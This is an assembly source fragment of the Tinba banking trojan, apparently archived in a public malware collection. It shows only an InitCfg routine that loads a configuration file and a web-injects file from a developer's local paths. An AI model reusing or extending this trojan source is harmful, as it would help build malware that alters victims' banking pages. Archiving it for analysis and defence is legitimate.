; ------------------------------------------------------------
; name      Tinba
; type      trojan
; cve       —
; year      unknown
; os        Windows
; authors   unknown
; source    RamadhanAmizudin/malware
; archived  RamadhanAmizudin, krisyotam (2026)
; notes     —
; ------------------------------------------------------------

.code

;; ==================================================================================================== ;;
;; InitCfg -                                                                                            ;;
;; ==================================================================================================== ;;
InitCfg proc

	invokx  &FileRead[ebx], 'c:\DEVELOP\CONFIG.TXT'
	mov  lpConfigFileData[ebx], eax


	invokx  &FileRead[ebx], 'c:\DEVELOP\INJECTS.TXT'
	mov  lpWebInjectsData[ebx], eax

	ret
InitCfg endp

	lpConfigFileData dd 0
	lpWebInjectsData dd 0
